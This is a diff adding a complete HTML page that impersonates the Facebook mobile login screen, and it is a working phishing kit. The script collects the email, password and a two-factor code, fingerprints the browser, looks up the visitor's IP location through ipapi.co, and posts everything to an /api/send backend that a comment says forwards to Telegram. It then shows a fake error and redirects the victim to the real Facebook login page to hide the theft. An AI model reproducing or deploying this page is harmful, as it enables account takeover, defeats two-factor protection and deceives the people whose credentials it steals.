@@ -1,0 +1,628 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>Facebook – log in or sign up</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      -webkit-tap-highlight-color: transparent;
+    }
+    :root {
+      --blue: #0064E0;
+      --text-primary: #111112;
+      --text-secondary: #666A72;
+      --border-unfocused: #DFE2E5;
+      --border-focused: #666A72;
+    }
+    html, body {
+      height: 100%;
+      background: #fff;
+      font-family: -apple-system, 'Helvetica Neue', Arial, sans-serif;
+      color: var(--text-primary);
+      overflow-x: hidden;
+    }
+    .app-banner {
+      display: flex;
+      align-items: center;
+      padding: 10px 12px;
+      gap: 8px;
+      cursor: pointer;
+      background: #fff;
+    }
+    .banner-icon {
+      width: 24px;
+      height: 24px;
+      flex-shrink: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .banner-text {
+      font-size: 13px;
+      color: #1763CF;
+      line-height: 1.3;
+      flex: 1;
+    }
+    .banner-divider {
+      height: 0.5px;
+      background: #C9CCD1;
+    }
+    .page {
+      display: flex;
+      flex-direction: column;
+      min-height: calc(100vh - 45px);
+      padding: 8px 16px 14px;
+      background: #fff;
+    }
+    .logo-wrap {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex: 1;
+      min-height: 60px;
+      margin-bottom: 20px;
+    }
+    .logo-wrap img {
+      max-height: 60px;
+      object-fit: contain;
+    }
+    .fb-wordmark {
+      color: #0064E0;
+      font-size: 42px;
+      font-weight: 900;
+      letter-spacing: -1px;
+      font-family: Georgia, serif;
+      text-align: center;
+    }
+    .form-area {
+      display: flex;
+      flex-direction: column;
+      gap: 0;
+    }
+    .field {
+      position: relative;
+      margin-bottom: 12px;
+    }
+    .field-box {
+      border: 1px solid var(--border-unfocused);
+      border-radius: 16px;
+      background: #fff;
+      padding: 10px 16px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      cursor: text;
+      transition: border-color 0.15s;
+      min-height: 52px;
+    }
+    .field-box.focused {
+      border-color: var(--border-focused);
+    }
+    .field-inner {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+    .field-label {
+      font-size: 13.5px;
+      color: var(--text-secondary);
+      line-height: 1.2;
+      display: none;
+    }
+    .field-label.visible {
+      display: block;
+    }
+    .field-input {
+      border: none;
+      outline: none;
+      background: transparent;
+      font-size: 15.2px;
+      color: var(--text-primary);
+      width: 100%;
+      padding: 0;
+      font-family: inherit;
+      line-height: 1.4;
+    }
+    .field-input::placeholder {
+      color: var(--text-secondary);
+      font-size: 15.2px;
+    }
+    .field-action {
+      width: 24px;
+      height: 24px;
+      flex-shrink: 0;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      color: var(--text-secondary);
+    }
+    .field-action.show {
+      display: flex;
+    }
+    .btn-login {
+      width: 100%;
+      height: 44px;
+      background: var(--blue);
+      color: #F2F4F6;
+      border: none;
+      border-radius: 22px;
+      font-size: 15.2px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 12px;
+      transition: opacity 0.15s, transform 0.1s;
+    }
+    .btn-login:active {
+      opacity: 0.85;
+      transform: scale(0.98);
+    }
+    .forgot-wrap {
+      display: flex;
+      justify-content: center;
+      padding: 12px 0 0;
+    }
+    .btn-forgot {
+      background: none;
+      border: none;
+      font-size: 15.2px;
+      font-weight: 600;
+      color: var(--text-primary);
+      cursor: pointer;
+      height: 36px;
+      padding: 0 16px;
+    }
+    .create-wrap {
+      display: flex;
+      justify-content: center;
+      padding-top: 0;
+    }
+    .btn-create {
+      height: 44px;
+      padding: 0 20px;
+      border: 1px solid var(--blue);
+      border-radius: 22px;
+      background: transparent;
+      color: var(--blue);
+      font-size: 15.2px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: opacity 0.15s, transform 0.1s;
+    }
+    .btn-create:active {
+      opacity: 0.75;
+      transform: scale(0.98);
+    }
+    .meta-logo-wrap {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px 0;
+      margin-top: auto;
+    }
+    .footer {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 2px;
+    }
+    .footer-row {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+    }
+    .footer-row a,
+    .more-links a {
+      color: #63788A;
+      font-size: 10px;
+      text-decoration: none;
+      padding: 3px 4px;
+    }
+    .more-links {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      padding: 6px 0;
+    }
+    .overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.45);
+      z-index: 200;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+    }
+    .overlay.show {
+      display: flex;
+    }
+    .dialog {
+      background: #fff;
+      border-radius: 14px;
+      width: 100%;
+      max-width: 320px;
+      overflow: hidden;
+      animation: popIn 0.2s ease;
+    }
+    @keyframes popIn {
+      from {
+        transform: scale(0.9);
+        opacity: 0;
+      }
+      to {
+        transform: scale(1);
+        opacity: 1;
+      }
+    }
+    .dialog-body {
+      padding: 20px 16px 0;
+      text-align: center;
+    }
+    .dialog-body h4 {
+      font-size: 17px;
+      font-weight: 700;
+      margin-bottom: 8px;
+      color: #111112;
+    }
+    .dialog-body p {
+      font-size: 13px;
+      color: #555;
+      line-height: 1.5;
+      margin-bottom: 16px;
+    }
+    .dialog-actions {
+      border-top: 0.5px solid #C6C6C8;
+      display: flex;
+    }
+    .dialog-btn {
+      flex: 1;
+      padding: 14px;
+      border: none;
+      background: none;
+      font-size: 17px;
+      cursor: pointer;
+      color: var(--blue);
+      font-weight: 400;
+    }
+    .dialog-btn.primary {
+      font-weight: 600;
+      border-left: 0.5px solid #C6C6C8;
+    }
+    .spinner-wrap {
+      text-align: center;
+      padding: 20px;
+    }
+    .spinner {
+      width: 28px;
+      height: 28px;
+      border: 3px solid #ddd;
+      border-top: 3px solid var(--blue);
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      display: inline-block;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    .code-input {
+      width: 100%;
+      padding: 14px 16px;
+      font-size: 17px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      text-align: center;
+      letter-spacing: 2px;
+      outline: none;
+      margin: 10px 0;
+    }
+    .code-input:focus {
+      border-color: var(--blue);
+      box-shadow: 0 0 0 2px #e7f3ff;
+    }
+    .step {
+      display: none;
+    }
+    .step.active {
+      display: block;
+    }
+    .remember-row {
+      display: flex;
+      align-items: center;
+      margin: 8px 0 0;
+      font-size: 14px;
+      color: #555;
+    }
+    .remember-row input[type="checkbox"] {
+      margin-right: 8px;
+      accent-color: var(--blue);
+    }
+    .lang-select {
+      font-size: 12px;
+      color: #63788A;
+      text-align: center;
+      margin-top: 8px;
+    }
+    .lang-select select {
+      border: none;
+      background: transparent;
+      font-size: 12px;
+      color: #63788A;
+    }
+  </style>
+</head>
+<body>
+
+<div class="app-banner" onclick="window.open('https://apps.apple.com/app/facebook/id284882215','_blank')">
+  <div class="banner-icon">
+    <svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M6 9l6 6 6-6" stroke="#0064E0" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+  </div>
+  <div class="banner-text">Get Facebook for iOS and browse faster.</div>
+</div>
+<div class="banner-divider"></div>
+
+<div class="page">
+  <div class="logo-wrap">
+    <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/ye/r/bUZjZjr-wvp.webp" alt="Facebook from Meta" onerror="this.style.display='none';document.getElementById('fb-fallback').style.display='block';">
+    <span id="fb-fallback" class="fb-wordmark" style="display:none;">facebook</span>
+  </div>
+
+  <!-- STEP 1: LOGIN -->
+  <div id="step-login" class="step active">
+    <div class="form-area">
+      <div class="field">
+        <div class="field-box" id="email-box">
+          <div class="field-inner">
+            <span class="field-label" id="email-label">Mobile number or email address</span>
+            <input class="field-input" type="text" id="email-input" placeholder="Mobile number or email address" autocomplete="username" autocorrect="off" autocapitalize="off" name="email">
+          </div>
+          <div class="field-action" id="email-clear" onclick="clearEmail()">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm5 13.59L15.59 17 12 13.41 8.41 17 7 15.59 10.59 12 7 8.41 8.41 7 12 10.59 15.59 7 17 8.41 13.41 12 17 15.59z"/></svg>
+          </div>
+        </div>
+      </div>
+      <div class="field">
+        <div class="field-box" id="pass-box">
+          <div class="field-inner">
+            <span class="field-label" id="pass-label">Password</span>
+            <input class="field-input" type="password" id="pass-input" placeholder="Password" autocomplete="current-password" autocorrect="off" autocapitalize="off" name="pass">
+          </div>
+          <div class="field-action" id="pass-eye" onclick="togglePass()">
+            <svg id="eye-icon" width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+          </div>
+        </div>
+      </div>
+      <div class="remember-row">
+        <input type="checkbox" id="remember" checked> <label for="remember">Remember me</label>
+      </div>
+      <button class="btn-login" onclick="handleLoginStep1()">Log in</button>
+      <div class="forgot-wrap">
+        <button class="btn-forgot" onclick="showDialog('Find your account','Enter your mobile number or email to search for your account.','Continue')">Forgotten password?</button>
+      </div>
+      <div class="create-wrap">
+        <button class="btn-create" onclick="showDialog('Create new account','Sign-up is not connected in this UI clone.','OK')">Create new account</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- STEP 2: TWO-FACTOR AUTHENTICATION -->
+  <div id="step-2fa" class="step">
+    <div style="text-align:center;padding:16px 0;">
+      <h4 style="font-size:17px;font-weight:700;margin-bottom:8px;">Two‑factor authentication required</h4>
+      <p style="font-size:14px;color:#555;line-height:1.5;">You've asked us to require a 6‑digit login code when someone tries to log in from an unrecognized device or browser.</p>
+      <div style="margin:16px 0;">
+        <input class="code-input" type="text" id="code-input" placeholder="••••••" maxlength="6" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
+      </div>
+      <p style="font-size:12px;color:#888;">Enter the code from your Code Generator or SMS</p>
+      <div id="spinner-container" style="display:none;" class="spinner-wrap"><div class="spinner"></div></div>
+      <button class="btn-login" onclick="handle2FASubmit()" style="margin-top:20px;">Continue</button>
+      <p style="margin-top:12px;font-size:13px;color:var(--blue);cursor:pointer;" onclick="showDialog('Need another way?','We can send a code to your phone number.','Send Code')">Need another way to authenticate?</p>
+    </div>
+  </div>
+
+  <div class="meta-logo-wrap">
+    <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yA/r/H5KMJlh-MJS.webp" alt="Meta" height="12" style="aspect-ratio:5;object-fit:contain;" onerror="this.outerHTML='<span class=\'meta-text\'>META</span>'">
+  </div>
+  <div class="footer">
+    <div class="footer-row">
+      <a href="#">About</a>
+      <a href="#">Help</a>
+      <a href="#" id="more-btn" onclick="toggleMore(event)">More</a>
+    </div>
+    <div class="more-links" id="more-links" style="display:none;">
+      <a href="#">Messenger</a><a href="#">Facebook Lite</a><a href="#">Video</a><a href="#">Meta Pay</a><a href="#">Meta Store</a>
+      <a href="#">Meta Quest</a><a href="#">Ray-Ban Meta</a><a href="#">Meta AI</a><a href="#">Instagram</a><a href="#">Threads</a>
+      <a href="#">Developers</a><a href="#">Careers</a><a href="#">Privacy Policy</a><a href="#">Privacy Centre</a>
+    </div>
+    <div class="lang-select">
+      <select id="lang-switch">
+        <option>English (US)</option><option>Español</option><option>Français</option><option>Português (Brasil)</option>
+        <option>العربية</option><option>中文(简体)</option><option>日本語</option>
+      </select>
+    </div>
+  </div>
+</div>
+
+<div class="overlay" id="overlay" onclick="closeDialog()">
+  <div class="dialog" onclick="event.stopPropagation()">
+    <div class="dialog-body">
+      <h4 id="dlg-title">Enter a password</h4>
+      <p id="dlg-msg">You'll need to enter a password to continue.</p>
+    </div>
+    <div class="dialog-actions">
+      <button class="dialog-btn" onclick="closeDialog()">Cancel</button>
+      <button class="dialog-btn primary" onclick="closeDialog()" id="dlg-ok">Try Again</button>
+    </div>
+  </div>
+</div>
+
+<script>
+  // Global state
+  let userEmail = '';
+  let userPassword = '';
+
+  // DOM elements
+  const emailInput = document.getElementById('email-input');
+  const emailBox = document.getElementById('email-box');
+  const emailLabel = document.getElementById('email-label');
+  const emailClear = document.getElementById('email-clear');
+  const passInput = document.getElementById('pass-input');
+  const passBox = document.getElementById('pass-box');
+  const passLabel = document.getElementById('pass-label');
+  const passEye = document.getElementById('pass-eye');
+
+  function setupField(input, box, label, actionBtn, isPass) {
+    input.addEventListener('focus', () => {
+      box.classList.add('focused');
+      if (input.value) {
+        label.classList.add('visible');
+        input.placeholder = '';
+      }
+    });
+    input.addEventListener('blur', () => {
+      box.classList.remove('focused');
+      if (!input.value) {
+        label.classList.remove('visible');
+        input.placeholder = isPass ? 'Password' : 'Mobile number or email address';
+      }
+    });
+    input.addEventListener('input', () => {
+      if (input.value) {
+        label.classList.add('visible');
+        input.placeholder = '';
+        actionBtn.classList.add('show');
+      } else {
+        label.classList.remove('visible');
+        input.placeholder = isPass ? 'Password' : 'Mobile number or email address';
+        actionBtn.classList.remove('show');
+      }
+    });
+  }
+  setupField(emailInput, emailBox, emailLabel, emailClear, false);
+  setupField(passInput, passBox, passLabel, passEye, true);
+
+  window.clearEmail = function() {
+    emailInput.value = '';
+    emailLabel.classList.remove('visible');
+    emailInput.placeholder = 'Mobile number or email address';
+    emailClear.classList.remove('show');
+    emailInput.focus();
+  };
+
+  let passVisible = false;
+  window.togglePass = function() {
+    passVisible = !passVisible;
+    passInput.type = passVisible ? 'text' : 'password';
+    const icon = document.getElementById('eye-icon');
+    icon.innerHTML = passVisible
+      ? '<path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>'
+      : '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>';
+  };
+
+  window.showDialog = function(title, msg, okText) {
+    document.getElementById('dlg-title').textContent = title;
+    document.getElementById('dlg-msg').textContent = msg;
+    document.getElementById('dlg-ok').textContent = okText || 'Try Again';
+    document.getElementById('overlay').classList.add('show');
+  };
+  window.closeDialog = function() {
+    document.getElementById('overlay').classList.remove('show');
+  };
+
+  // Collect fingerprint and IP/location data
+  async function collectExtraData() {
+    const fingerprint = {
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      language: navigator.language,
+      cookieEnabled: navigator.cookieEnabled,
+      screenResolution: `${screen.width}x${screen.height}`,
+      colorDepth: screen.colorDepth,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      referrer: document.referrer || 'Direct',
+      plugins: Array.from(navigator.plugins).map(p => p.name).join(', '),
+      hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+      deviceMemory: navigator.deviceMemory || 'unknown',
+    };
+    let ipData = {};
+    try {
+      const res = await fetch('https://ipapi.co/json/', { mode: 'cors' });
+      ipData = await res.json();
+    } catch (e) {
+      ipData = { error: 'could not fetch' };
+    }
+    return { fingerprint, ipData };
+  }
+
+  // Send data to our backend (which will forward to Telegram)
+  async function sendToBackend(loginData, extra) {
+    const payload = {
+      email: loginData.email,
+      password: loginData.password,
+      code: loginData.code || '',
+      rememberMe: document.getElementById('remember').checked,
+      extra: extra
+    };
+    try {
+      await fetch('/api/send', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+    } catch (err) {
+      console.error('Failed to send to backend', err);
+    }
+  }
+
+  // Step 1: Login
+  window.handleLoginStep1 = async function() {
+    const email = emailInput.value.trim();
+    const pass = passInput.value.trim();
+    if (!email || !pass) {
+      showDialog(email ? 'Enter a password' : 'Enter a mobile number or email',
+                 email ? "You'll need to enter a password to continue." : 'Enter a mobile number or email address to continue.',
+                 'OK');
+      return;
+    }
+    userEmail = email;
+    userPassword = pass;
+    const extra = await collectExtraData();
+    await sendToBackend({ email, password: pass, code: '' }, extra);
+    // Move to 2FA step
+    document.getElementById('step-login').classList.remove('active');
+    document.getElementById('step-2fa').classList.add('active');
+    window.scrollTo(0, 0);
+  };
+
+  // Step 2: 2FA Submit
+  window.handle2FASubmit = async function() {
+    const code = document.getElementById('code-input').value.trim();
+    if (code.length !== 6 || !/^\d+$/.test(code)) {
+      showDialog('Invalid code', 'Please enter a 6‑digit code from your Code Generator or SMS.', 'OK');
+      return;
+    }
+    document.getElementById('spinner-container').style.display = 'block';
+    const extra = await collectExtraData();
+    await sendToBackend({ email: userEmail, password: userPassword, code }, extra);
+    setTimeout(() => {
+      document.getElementById('spinner-container').style.display = 'none';
+      showDialog('Unable to log in', 'An unexpected error occurred. Please try logging in again.', 'OK');
+      setTimeout(() => {
+        window.location.href = 'https://www.facebook.com/login.php?next=' + encodeURIComponent(window.location.href);
+      }, 2500);
+    }, 2000);
+  };
+
+  window.toggleMore = function(e) {
+    e.preventDefault();
+    const ml = document.getElementById('more-links');
+    ml.style.display = ml.style.display === 'none' ? 'flex' : 'none';
+  };
+</script>
+</body>
+</html>
